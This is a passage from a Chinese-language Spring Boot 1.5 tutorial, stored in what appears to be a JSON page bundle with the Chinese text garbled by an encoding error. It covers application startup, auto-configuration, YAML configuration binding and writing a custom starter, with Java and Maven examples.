this.setInitializers(this.getSpringFactoriesInstances(ApplicationContextInitializer.class));\n      // ç±»è·¯å¾ä¸å¯»æ¾  ApplicationListener å¹¶ä¿å­\n      this.setListeners(this.getSpringFactoriesInstances(ApplicationListener.class));\n      // å¤ä¸ªéç½®ç±»ä¸­æ¾å°æMainæ¹æ³çéç½®ç±»ã \n      this.mainApplicationClass = this.deduceMainApplicationClass();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n * è¿è¡runæ¹æ³\n\npublic ConfigurableApplicationContext run(String... args) {\n        StopWatch stopWatch = new StopWatch();\n        stopWatch.start();\n        ConfigurableApplicationContext context = null;\n        FailureAnalyzers analyzers = null;\n        this.configureHeadlessProperty();\n  // \tè·åSpringApplicationRUnListener ä»ç±»è·¯å¾ä¸çMATE-INF/spring.factorieséå¯»æ¾\n        SpringApplicationRunListeners listeners = this.getRunListeners(args);\n  \n  \t\t// åææælistenerçstartingæ¹æ³\n        listeners.starting();\n\n        try {\n          // å°è£Args\n            ApplicationArguments applicationArguments = new DefaultApplicationArguments(args);\n          \t// åå¤ç¯å¢ï¼ åå»ºç¯å¢  éç½®ç¯å¢  åè°listenerçenvironmentPrepared  æ¹æ³\n          ConfigurableEnvironment environment = this.prepareEnvironment(listeners, applicationArguments);\n          \t// æå°å¯å¨æ¶çbanner \n          Banner printedBanner = this.printBanner(environment);\n            \n          \t// åå»ºcontext iocå®¹å¨\n          context = this.createApplicationContext();\n            \n          new FailureAnalyzers(context);\n          // åå¤ä¸ä¸æç¯å¢\n       \t\t\t// å°envä¿å­å°iocï¼è·åææçApplicationInitalizer è°ç¨initailzeæ¹æ³ ï¼ åè°æælistenerçcontextPreparedæ¹æ³ã æååè° listenerçcontextLoadedæ¹æ³\n          this.prepareContext(context, environment, liteners, applicationArguments, printedBanner);\n\t\t\t\t// å·çº¿å®¹å¨ iocå®¹å¨åå§å\n          this.refreshContext(context);\n          // callRUnner è·åææçApplicationRunner ã ç¶åè·åææçCommandLineRunner å¹¶è¿è¡ä»ä»¬çrunæ¹æ³\n            this.afterRefresh(context, applicationArguments);\n          // åè°listenerçfinishedæ¹æ³\n            listeners.finished(context, (Throwable)null);\n            stopWatch.stop();\n            if (this.logStartupInfo) {\n                (new StartupInfoLogger(this.mainApplicationClass)).logStarted(this.getApplicationLog(), stopWatch);\n            }\n// è¿åIOCå®¹å¨\n            return context;\n        } catch (Throwable var9) {\n            this.handleRunFailure(context, listeners, (FailureAnalyzers)analyzers, var9);\n            throw new IllegalStateException(var9);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\n\n# äºä»¶çå¬æºå¶\n\nå ä¸ªéè¦çäºä»¶åè°æºå¶\n\néç½®å¨META-INF/spring.factories\n\nApplicationContextInitializer\n\nSpringApplicationRunListener\n\nåªéè¦æ¾å¨iocå®¹å¨ä¸­\n\nApplicationRunner\n\nCommandLineRunner\n\n\n# Springbootèªå®ä¹starter\n\nstarteråºæ¯å¯å¨å¨ï¼\n\n 1. éè¦å¯¼å¥çä¾èµ\n\n 2. å¦ä½ç¼åèªå¨éç½®\n\n@Configuration //æå®è¿ä¸ªç±»æ¯ä¸ä¸ªéç½®ç±» \n@ConditionalOnXXX //å¨æå®æ¡ä»¶æç«çæåµä¸èªå¨éç½®ç±»çæ \n@AutoConfigureAfter //æå®èªå¨éç½®ç±»çé¡ºåº \n@Bean //ç»å®¹å¨ä¸­æ·»å ç»ä»¶\n\n@ConfigurationPropertie//ç»åç¸å³xxxPropertiesç±»æ¥ç»å®ç¸å³çéç½®\n@EnableConfigurationProperties //è®©xxxPropertiesçæå å¥å°å®¹å¨ä¸­\n\nèªå¨éç½®ç±»è¦è½å è½½ å°éè¦å¯å¨å°±å è½½çèªå¨éç½®ç±»ï¼éç½®å¨METAâINF/spring.factories org.springframework.boot.autoconfigure.EnableAutoConfiguration=\\ org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\\ org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\\\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n\n\n# æ­¥éª¤\n\n 1. åå»ºä¸¤ä¸ªmavené¡¹ç®\n\n<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchemaâinstance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/mavenâ4.0.0.xsd"> <modelVersion>4.0.0</modelVersion>\n\n<groupId>com.atguigu.starter</groupId> \n  <artifactId>atguiguâspringâbootâstarter</artifactId> \n  <version>1.0âSNAPSHOT</version>\n\n<!ââå¯å¨å¨ââ> \n  <dependencies>\n\n<!ââå¼å¥èªå¨éç½®æ¨¡åââ> \n    <dependency> \n      <groupId>com.atguigu.starter</groupId> \n      <artifactId>atguiguâspringâbootâstarterâautoconfigurer</artifactId> \n      <version>0.0.1âSNAPSHOT</version> \n    </dependency> \n  </dependencies>\n\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n<?xml version="1.0" encoding="UTFâ8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchemaâinstance"\n\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven4.0.0.xsd">\n\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>com.atguigu.starter</groupId>\n    <artifactId>atguiguâspringâbootâstarterâautoconfigurer</artifactId>\n    <version>0.0.1âSNAPSHOT</version>\n    <packaging>jar</packaging>\n\n    <name>atguiguâspringâbootâstarterâautoconfigurer</name>\n    <description>Demo project for Spring Boot</description>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>springâbootâstarterâparent</artifactId>\n        <version>1.5.10.RELEASE</version>\n        <relativePath/>\n        <!ââ lookup parent from repository ââ>\n    </parent>\n\n    <properties>\n        <project.build.sourceEncoding>UTFâ8</project.build.sourceEncoding>\n        <project.reporting.outputEncoding>UTFâ8</project.reporting.outputEncoding>\n        <java.version>1.8</java.version>\n    </properties>\n\n    <dependencies>\n\n        <!ââå¼å¥springâbootâstarterï¼ææstarterçåºæ¬éç½®ââ>\n        <dependency>\n\n            <groupId>org.springframework.boot</groupId>\n\n            <artifactId>springâbootâstarter</artifactId>\n        </dependency>\n\n    </dependencies>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\nèªå®ä¹properties\n\npackage com.atguigu.starter;\n\nimport org.springframework.boot.context.properties.ConfigurationProperties;\n\n@ConfigurationProperties(prefix = "atguigu.hello")\npublic class HelloProperties {\nprivate String prefix; \n  private String suffix;\n\npublic String getPrefix() { return prefix; }\n\npublic void setPrefix(String prefix) { this.prefix = prefix; }\n\npublic String getSuffix() { return suffix; }\n\npublic void setSuffix(String suffix) { this.suffix = suffix; }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nèªå®ä¹Service\n\npackage com.atguigu.starter;\n\npublic class HelloService {\n\nHelloProperties helloProperties;\n\npublic HelloProperties getHelloProperties() { return helloProperties; }\n\npublic void setHelloProperties(HelloProperties helloProperties) { this.helloProperties = helloProperties; }\n\npublic String sayHellAtguigu(String name){ \n  return helloProperties.getPrefix()+"â" +name + helloProperties.getSuffix(); }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nèªå¨éç½®\n\npackage com.atguigu.starter;\n\nimport org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.autoconfigure.condition.ConditionalOnWebApplication; import org.springframework.boot.context.properties.EnableConfigurationProperties; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration;\n\n@Configuration\n@ConditionalOnWebApplication //webåºç¨æçæ @EnableConfigurationProperties(HelloProperties.class) \npublic class HelloServiceAutoConfiguration {\n\n  @Autowired HelloProperties helloProperties; \n  @Bean \n  public HelloService helloService(){\n\n    HelloService service = new HelloService();\n\n    service.setHelloProperties(helloProperties);\n\n    return service; \n  }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# springboot åºç¡ - åºäº 1.5.9\n\n\n# springbootç®ä»\n\nspringbootæ¯ç®åspringåºç¨å¼åçä¸ä¸ªæ¡æ¶ï¼å¶ä¸­æ´åäºspringææ¯æ ï¼æ¯j2eeå¼åçä¸ç«å¼è§£å³æ¹æ¡ãå¨ä¼ ç»çåºäºssmæ¡æ¶è¿è¡é¡¹ç®å¼åçè¿ç¨ä¸­ï¼æä»¬éè¦éç½®å¤§éçéç½®æä»¶ï¼ç¨äºçº¦ææ¡æ¶çåè½åéç½®ãspringbootåºäºâçº¦å®å¤§äºéç½®âçå¼åææ³ï¼åä¸ªç»ä»¶çéç½®æä»¶ç±springbootå¸®å©æä»¬å®æï¼æä»¬åªéè¦å°éçéç½®å³å¯æ­å»ºä¸ä¸ªé¡¹ç®å¼åçåºæ¬ç¯å¢ï¼æ´ä¸æ³¨äºä¸å¡ä»£ç çç¼åã\n\nä½¿ç¨springbootçä¼ç¹ï¼\n\n * å¿«éåå»ºç¬ç«è¿è¡çspringåºç¨ï¼å¹¶å¯ä»¥éæä¸»æµçæ¡æ¶\n * ä½¿ç¨åµå¥å¼çservletå®¹å¨ï¼åºç¨æ éæwarå\n * ä½¿ç¨startersè¿è¡èªå¨ä¾èµåçæ¬æ§å¶\n * ä¸»æµæ¡æ¶çèªå¨é»è®¤éç½®ï¼æ ä»£ç çæï¼å¼ç®±å³ç¨\n * åçäº§ç¯å¢çè¿è¡æ¶çæ§\n * å¤©ç¶éæäºè®¡ç®\n\n\n# å¾®æå¡\n\n> martinfowler.com\n\nå¾®æå¡æ¯å½åé¡¹ç®å¼åçç­ç¹ãåé¡¾ä¼ ç»çåä½åºç¨å¼åï¼æä»¬æ´ä¸ªé¡¹ç®é»è®¤æ¯é¨ç½²å¨åä¸å°æå¡å¨ä¸çï¼æä»¬å°ç¼åå¥½çé¡¹ç®ææwaråï¼æ¾å°tomcatä¸­è¿è¡ãå¨ç¨æ·éè¾å°ãé¡¹ç®è¾ä¸ºç®åçåºæ¯ä¸æ²¡æä»ä¹å¼å¸¸ï¼é¨ç½²èµ·æ¥ä¹ç¸å¯¹æ¹ä¾¿ãä½æ¯å¦æé¡¹ç®çè®¿é®éè¾å¤§ï¼æä»¬æå¡å¨çèµæºååè¾å¤§ï¼åä½åºç¨å°±æ æ³æ¯æèµ·ç¨æ·çéæ±ãå¨è¿ç§æåµä¸ï¼æä»¬éå¸¸ä¼å°é¡¹ç®é¨ç½²å¨å¤ä¸ªæå¡å¨ä¸ï¼ç¶åä½¿ç¨è´è½½åè¡¡å°ç¨æ·çè®¿é®åéå°ä¸åçæå¡å¨ä¸ãé£ä¹ï¼å¦æåªæ¯åä¸ªåè½è®¿é®éè¾å¤§ï¼æ¯å¦ï¼è®¢ååè½ãä¼ååè½ï¼è¿ç§æ¹å¼å°±ä¼å¯¼è´æå¡å¨çèµæºæµªè´¹ãå¾®æå¡çææ³åºè¿èçã\n\n\n\næè°å¾®æå¡ï¼å°±æ¯å°åæ¬çåä½åºç¨æ½ç¦»åºå¤ä¸ªåè½æ¨¡åï¼æ¯ä¸ªåè½æ¨¡åé½å¯ä»¥åç¬é¨ç½²ãå¦ææä¸ªæ¨¡åçè®¿é®è¦æ±è¾é«ï¼å°ä¸åæ¨¡åä¹é´çå¨æç»åï¼é¨ç½²å°å¶ä»æå¡å¨ä¸ãæ¯ä¸ªåè½æ¨¡åé½æ¯å¯ä»¥ç¬ç«æ¿æ¢åç¬ç«åçº§çååãå¦ä¸å¾æç¤ºï¼\n\n\n\n\n# helloworld\n\n# helloworldç¼å\n\n> æµè§å¨åéhelloè¯·æ±ï¼æå¡å¨æ¥æ¶è¯·æ±å¹¶å°helloworldè¿åç»æµè§å¨ã\n\n 1. åå»ºmavenå·¥ç¨ï¼å¹¶å¯¼å¥springbootç¸å³ä¾èµã\n    \n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>1.5.9.release</version>\n    </parent>\n    \n    <dependencies>\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-web</artifactid>\n        </dependency>\n    </dependencies>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 2. ç¼åä¸»ç¨åºï¼ç¨äºå¯å¨springbootåºç¨\n    \n    package com.pwddd;\n    \n    import org.springframework.boot.springapplication;\n    import org.springframework.boot.autoconfigure.springbootapplication;\n    \n    @springbootapplication\n    public class springboottestapplication {\n        public static void main(string[] args) {\n            springapplication.run(springboottestapplication.class,args);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n\n 3. ç¼åcontrollerå¤çç¨æ·è¯·æ±\n    \n    package com.pwddd.controller;\n    \n    import org.springframework.stereotype.controller;\n    import org.springframework.web.bind.annotation.getmapping;\n    import org.springframework.web.bind.annotation.responsebody;\n    \n    @controller\n    public class hellocontroller {\n    \n        @getmapping("/hello")\n        @responsebody\n        public string hello(){\n            return "helloworld";\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 4. è¿è¡ä¸»ç¨åº\n\n 5. springbootåºç¨æå\n    \n    * å¯¼å¥springbooté¡¹ç®æä»¶\n      \n      <build>\n          <plugins>\n              <plugin>\n                  <groupid>org.springframework.boot</groupid>\n                  <artifactid>spring-boot-maven-plugin</artifactid>\n              </plugin>\n          </plugins>\n      </build>\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      \n    \n    * è¿è¡maven -> package\n    \n    * java -jarè¿è¡\n\n# helloworldè§£æ\n\n# ç¶é¡¹ç®çæ¬ä»²è£\n\nå¨åå»ºmavené¡¹ç®ä¸­ï¼æå®äºmavençç¶é¡¹ç®ã\n\n<parent>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-parent</artifactid>\n    <version>1.5.9.release</version>\n</parent>\n\n\n1\n2\n3\n4\n5\n\n\nè¯¥ç¶é¡¹ç®åæå®äºå¦ä¸ä¸ªç¶é¡¹ç®ã\n\n<parent>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-dependencies</artifactid>\n    <version>1.5.9.release</version>\n    <relativepath>../../spring-boot-dependencies</relativepath>\n</parent>\n\n\n1\n2\n3\n4\n5\n6\n\n\nè¿ä¸ªç¶é¡¹ç®ä¸­å¶å®äºç¸å³ç»ä»¶ççæ¬ã\n\n<properties>\n    \x3c!-- dependency versions --\x3e\n    <activemq.version>5.14.5</activemq.version>\n    <antlr2.version>2.7.7</antlr2.version>\n    â¦â¦â¦â¦\n\n\n1\n2\n3\n4\n5\n\n\n# åºæ¯å¯å¨å¨\n\nspringboot starteræ¯springbootçåºæ¯å¯å¨å¨ï¼å¸®æä»¬å¯¼å¥äºç¸å³æ¨¡åè¿è¡çç¸å³ä¾èµãspringbootå°å¸¸è§çåè½åºæ¯æ½ç¦»åºæ¥ï¼æä»¬ä½¿ç¨æ¶åªéè¦å¼ç¨ç¸å³çåºæ¯å¯å¨å¨ï¼springbootä¼å¸®æä»¬èªå¨å¯¼å¥ç¸å³çä¾èµã\n\n# springbootåºç¨çå¯å¨\n\nå¨springbootå¯å¨ç±»ä¸æ@springbootapplicationæ³¨è§£ï¼è¯¥æ³¨è§£è¯´æäºè¯¥ç±»æ¯å½åé¡¹ç®çä¸»éç½®ç±»ï¼springbooté¡¹ç®å¯ä»¥è¿è¡è¯¥ç±»çmainæ¹æ³å¯å¨é¡¹ç®ãè¯¥æ³¨è§£æ¯ä¸ä¸ªç»åæ³¨è§£ï¼ååå«äºä»¥ä¸çåå®¹ã\n\n@target({elementtype.type})\n@retention(retentionpolicy.runtime)\n@documented\n@inherited\n@springbootconfiguration\n@enableautoconfiguration\n@componentscan(\n    excludefilters = {@filter(\n    type = filtertype.custom,\n    classes = {typeexcludefilter.class}\n), @filter(\n    type = filtertype.custom,\n    classes = {autoconfigurationexcludefilter.class}\n)}\n)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n@springbootconfigurationæ³¨è§£ï¼æ æ³¨springbootçéç½®ç±»ã\n\n@enableautoconfigurationæ³¨è§£ï¼å¼å¯äºèªå¨éç½®çåè½ãä¹åå¨ä½¿ç¨ssmæ¡æ¶æ¶ï¼éè¦èªå·±å¯¼å¥ç¸å³çä¾èµåéç½®ï¼å¼å¯èªå¨éç½®ä¹åå°±å¯ä»¥èªå¨å®æç¸å³éç½®ã\n\nå¨è¯¥æ³¨è§£ä¸­ï¼åå«äºä»¥ä¸çæ³¨è§£åå®¹ï¼\n\n@target({elementtype.type})\n@retention(retentionpolicy.runtime)\n@documented\n@inherited\n@autoconfigurationpackage\n@import({enableautoconfigurationimportselector.class})\npublic @interface enableautoconfiguration {\n    string enabled_override_property = "spring.boot.enableautoconfiguration";\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n@autoconfigurationpackage: èªå¨éç½®å\n\nèªå¨éç½®åç±å¦ä¸çæ³¨è§£ç»æï¼\n\n@target({elementtype.type})\n@retention(retentionpolicy.runtime)\n@documented\n@inherited\n@import({registrar.class})\npublic @interface autoconfigurationpackage {\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n@import({registrar.class}): importæ¯springåºå±çæ³¨è§£ï¼è¯¥æ³¨è§£ç»å®¹å¨ä¸­å¯¼å¥ä¸ä¸ªç»ä»¶ãå¯¼å¥ç»ä»¶ç±registrarå®ä¹ãè¯¥ç±»å°applicationä¸»éç½®ç±»æå¨åä¸çææå­åä¸­çç»ä»¶æ·»å æ«æå°springå®¹å¨ä¸­ã\n\n public void registerbeandefinitions(annotationmetadata metadata, beandefinitionregistry registry) {\n            autoconfigurationpackages.register(registry, (new autoconfigurationpackages.packageimport(metadata)).getpackagename());\n        }\n\n\n1\n2\n3\n\n\nenableautoconfigurationimportselectorï¼èªå¨éç½®å¯¼å¥çéæ©å¨ãå°ææéè¦å¯¼å¥çç»ä»¶ä»¥å¨ç±»åçæ¹å¼è¿åï¼è¿äºç»ä»¶å°±ä¼è¢«æ·»å å°å®¹å¨ä¸­ã\n\npublic string[] selectimports(annotationmetadata annotationmetadata) {\n    if (!this.isenabled(annotationmetadata)) {\n        return no_imports;\n    } else {\n        try {\n            autoconfigurationmetadata autoconfigurationmetadata = autoconfigurationmetadataloader.loadmetadata(this.beanclassloader);\n            annotationattributes attributes = this.getattributes(annotationmetadata);\n            list<string> configurations = this.getcandidateconfigurations(annotationmetadata, attributes);\n            configurations = this.removeduplicates(configurations);\n            configurations = this.sort(configurations, autoconfigurationmetadata);\n            set<string> exclusions = this.getexclusions(annotationmetadata, attributes);\n            this.checkexcludedclasses(configurations, exclusions);\n            configurations.removeall(exclusions);\n            configurations = this.filter(configurations, autoconfigurationmetadata);\n            this.fireautoconfigurationimportevents(configurations, exclusions);\n            return (string[])configurations.toarray(new string[configurations.size()]);\n        } catch (ioexception var6) {\n            throw new illegalstateexception(var6);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nå¶ä¸­configurationä¸­å°±åå«äºç»ä»¶çå¨ç±»åï¼ç±this.getcandidateconfigurations(annotationmetadata, attributes);æ¹æ³è·åï¼è¯¥æ¹æ³ä¸­è°ç¨äºspringfactoriesloader.loadfactorynamesãä»éç½®æä»¶ä¸­è·åäºå¨ç±»åã\n\nenumeration<url> urls = classloader != null ? classloader.getresources("meta-inf/spring.factories") : classloader.getsystemresources("meta-inf/spring.factories");\n\n\n1\n\n\nspringbootå¨å¯å¨çæ¶åä»ç±»è·¯å¾ä¸çmeta-inf/spring.factoriesä¸­è·åenableautoconfigurationæå®çå¼ï¼å°è¿äºå¼ä½ä¸ºèªå¨éç½®ç±»å¯¼å¥å°å®¹å¨ä¸­ï¼èªå¨éç½®ç±»å°±çæï¼å¸®æä»¬è¿è¡èªå¨éç½®å·¥ä½ã\n\n\n# springbootéç½®æä»¶\n\nspringbootä¸­æä¸¤ç§ç±»åçéç½®æä»¶ï¼application.propertiesåapplication.ymlã\n\néç½®æä»¶çä½ç¨ï¼springbootå¨åºå±åå¥½äºç»ä»¶çåºæ¬éç½®ï¼å½æä»¬æ³è¦èªå®ä¹éç½®æ¶ï¼å°±éè¦å®ä¹éç½®æä»¶ã\n\n\n# yamlè¯­æ³\n\n# åºæ¬è¯­æ³\n\nyamlæ¯åºäºé®å¼å¯¹çè¯­æ³æ¨¡å¼ï¼ä½¿ç¨ç©ºæ ¼å®æå±çº§çç¼©è¿ï¼åªè¦æ¯å¯¹é½çç©ºæ ¼æ°ï¼å°±è®¤ä¸ºæ¯åä¸å±çº§çãyamlç¸å¯¹äºxmléç½®æä»¶ï¼æ´å å³æ³¨æ°æ®ãåºæ¬æ ·å¼å¦ä¸ï¼\n\nserver:\n  port: 8081\n\n\n1\n2\n\n\n# å¼è¯­æ³\n\nå­é¢éï¼k: vå­é¢éå¯ä»¥ç´æ¥åï¼å­ç¬¦ä¸²é»è®¤ä¸å åå¼å·æèåå¼å·ãåå¼å·ä¸ä¼è½¬ä¹å­ç¬¦ä¸²éé¢çç¹æ®å­ç¬¦ãèä½¿ç¨åå¼å·ä¼å¯¹ç¹æ®å­ç¬¦è¿è¡è½¬ä¹ã\n\nå¯¹è±¡ãmapï¼\n\n# å¯¹è±¡ãmapçåæ³\nfriends:\n\tlastname: zhangsan\n\tage: 20\n\t\n# å¯¹è±¡ãmapçè¡ååæ³\nfriends: {lastname: zhangsan,age: 18}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\næ°ç»ï¼\n\n# æ°ç»çåæ³\npets:\n - cat\n - dog\n - pig\n# æ°ç»çè¡ååæ³\npets: [cat,dog,pig]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# éç½®æä»¶å¼å¯¼å¥javabean\n\njavabean\n\npackage com.pwddd.springboot.bean;\n\nimport org.springframework.beans.factory.annotation.value;\nimport org.springframework.boot.context.properties.configurationproperties;\nimport org.springframework.stereotype.component;\n\nimport java.util.list;\nimport java.util.map;\n\n@configurationproperties(prefix = "person")\n@component\npublic class person {\n\n    private string name;\n    private integer age;\n    private boolean boss;\n    private map<string,string> maps;\n    private list<string> lists;\n    private dog dog;\n\n    @override\n    public string tostring() {\n        return "person{" +\n                "name=\'" + name + \'\\\'\' +\n                ", age=" + age +\n                ", boss=" + boss +\n                ", maps=" + maps +\n                ", lists=" + lists +\n                ", dog=" + dog +\n                \'}\';\n    }\n\n    public string getname() {\n        return name;\n    }\n\n    public void setname(string name) {\n        this.name = name;\n    }\n\n    public integer getage() {\n        return age;\n    }\n\n    public void setage(integer age) {\n        this.age = age;\n    }\n\n    public boolean isboss() {\n        return boss;\n    }\n\n    public void setboss(boolean boss) {\n        this.boss = boss;\n    }\n\n    public map<string, string> getmaps() {\n        return maps;\n    }\n\n    public void setmaps(map<string, string> maps) {\n        this.maps = maps;\n    }\n\n    public list<string> getlists() {\n        return lists;\n    }\n\n    public void setlists(list<string> lists) {\n        this.lists = lists;\n    }\n\n    public dog getdog() {\n        return dog;\n    }\n\n    public void setdog(dog dog) {\n        this.dog = dog;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n\n\npackage com.pwddd.bean;\n\npublic class dog {\n    private string name;\n    private integer age;\n\n    @override\n    public string tostring() {\n        return "dog{" +\n                "name=\'" + name + \'\\\'\' +\n                ", age=" + age +\n                \'}\';\n    }\n\n    public dog() {\n    }\n\n    public string getname() {\n        return name;\n    }\n\n    public void setname(string name) {\n        this.name = name;\n    }\n\n    public integer getage() {\n        return age;\n    }\n\n    public void setage(integer age) {\n        this.age = age;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\næ·»å éç½®å¤çå¨ï¼ç¨æ¥æç¤ºéç½®æä»¶\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-configuration-processor</artifactid>\n    <optional>true</optional>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nç¼åéç½®æä»¶\n\nperson:\n  name: zhangsan\n  age: 12\n  maps: {zhangsan: aaa,lisi: bbb}\n  lists:\n    - zhangsan\n    - lisi\n  dog:\n    name: zhangsan\n    age: 12\n\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nç¼åæµè¯\n\n@springboottest\nclass springbootapplicationtests {\n\n    @autowired\n    person person;\n\n    @test\n    public void testproperties(){\n        system.out.println(person);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# å¶ä»è·åå¼çæ¹æ³\n\n//@configurationproperties(prefix = "person")\n@component\npublic class person {\n\n    private string name;\n    @value("${person.age}")\n    private integer age;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nconfigurationpropertiesåvalueçåºå«ï¼\n\n             @configurationproperties   @value\nåè½           æ¹éæ³¨å¥éç½®æä»¶ä¸­çå±æ§               ä¸ä¸ªä¸ªæå®\næ¾æ£ç»å®ï¼æ¾æ£è¯­æ³ï¼   æ¯æ                         ä¸æ¯æ\nspel         ä¸æ¯æ                        æ¯æ\njsr303æ°æ®æ ¡éª   æ¯æ                         ä¸æ¯æ\nå¤æç±»åå°è£       æ¯æ                         ä¸æ¯æ\n\nå¦æè¯´ï¼æä»¬åªæ¯å¨æä¸ªä¸å¡é»è¾ä¸­éè¦è·åä¸ä¸éç½®æä»¶ä¸­çæé¡¹å¼ï¼ä½¿ç¨@valueãå¦æè¯´ï¼æä»¬ä¸é¨ç¼åäºä¸ä¸ªjavabeanæ¥åéç½®æä»¶è¿è¡æ å°ï¼æä»¬å°±ç´æ¥ä½¿ç¨@configurationpropertiesã\n\n\n# éç½®æä»¶æ³¨å¥å¼æ°æ®æ ¡éª\n\n@component\n@configurationproperties(prefix = "person")\n@validated\npublic class person {\n/**\n* <bean class="person">\n* <property name="lastname" value="å­é¢é/${key}ä»ç¯å¢åéãéç½®æä»¶ä¸­è·åå¼/#\n{spel}"></property>\n* <bean/>\n*/\n//lastnameå¿é¡»æ¯é®ç®±æ ¼å¼\n@email\n//@value("${person.lastâname}")\nprivate string lastname;\n//@value("#{11*2}")\nprivate integer age;\n//@value("true")\nprivate boolean boss;\nprivate date birth;\nprivate map<string,object> maps;\nprivate list<object> lists;\nprivate dog dog;\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# @propertiesource\n\n@propertiesource:å è½½æå®çéç½®æä»¶ãé»è®¤ä»å¨å±éç½®æä»¶ä¸­å è½½éç½®ï¼å¦æéè¦æå®å¶ä»çéç½®æä»¶çä½ç½®ï¼å°±å¯ä»¥ä½¿ç¨è¯¥æ³¨è§£ã\n\n@importresourceï¼å¯¼å¥springçéç½®æä»¶ï¼è®©éç½®æä»¶éé¢çåå®¹çæãspringbootéé¢æ²¡æspringçéç½®æä»¶ï¼æä»¬èªå·±ç¼åçéç½®æä»¶ï¼ä¹ä¸è½èªå¨è¯å«ãæ³è®©springçéç½®æä»¶çæï¼å è½½è¿æ¥ã\n\n@importresource(locations = {"classpath:beans.xml"})\n//å¯¼å¥springçéç½®æä»¶è®©å¶çæ\n\n\n1\n2\n\n\nspringbootæ¨èç»å®¹å¨ä¸­æ·»å ç»ä»¶çæ¹å¼ï¼æ¨èä½¿ç¨å¨æ³¨è§£çæ¹å¼ã\n\n 1. éç½®ç±»æ·»å @configurationæ³¨è§£ï¼ææå½åç±»æ¯ä¸ä¸ªéç½®ç±»ã\n\n 2. ä½¿ç¨@beanç»å®¹å¨ä¸­æ·»å ç»ä»¶\n\npackage com.pwddd.springboot.config;\n\nimport org.springframework.context.annotation.configuration;\n\n@configuration\npublic class myappconfig {\n//å°æ¹æ³çè¿åå¼æ·»å å°å®¹å¨ä¸­ï¼å®¹å¨ä¸­è¿ä¸ªç»ä»¶é»è®¤çidå°±æ¯æ¹æ³å\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# éç½®æä»¶å 